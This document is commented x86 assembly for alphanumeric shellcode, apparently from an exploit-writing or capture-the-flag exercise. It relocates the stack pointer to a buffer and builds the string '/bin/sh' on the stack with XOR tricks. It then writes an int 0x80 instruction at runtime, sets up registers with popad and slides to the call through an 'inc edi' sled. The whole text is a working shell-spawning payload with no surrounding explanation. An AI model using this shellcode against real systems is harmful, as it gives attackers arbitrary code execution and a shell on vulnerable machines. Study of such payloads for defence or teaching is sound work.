; Relocate esp to buffer
push esp
pop eax
push esp
push ecx
dec eax (0x28 times)
.
.
.
dec eax
xor esp, [eax + 0x20]
xor esp, [eax + 0x24]

; put "/bin/sh" onto stack
push 0x30
pop eax
xor al, 0x30
push eax
pop edx
push edx
push 0x68735858
pop eax
xor ax, 0x7777
push eax
push 0x30
pop eax
xor al, 0x30
xor eax, 0x6e696230
dec eax
push eax

; Prepare stack before popad
push esp
pop eax
push edx
push ecx
push ebx
push eax
push esp
push ebp
push esi
push edi

; push int 0x80 opcode to the top of the stack
push esi
pop eax
dec eax
xor ax, 0x4f73
xor ax, 0x3041
push eax
pop eax

; popad to set ebx to point to "/bin/sh"
popad

; set eax, ecx, edx before calling int 0x80
push eax
pop ecx
push eax
pop edx
push ebx
xor al, 0x4a
xor al, 0x41

; NOP sled until reaching the pushed int 0x80
inc edi
.
.
.
inc edi
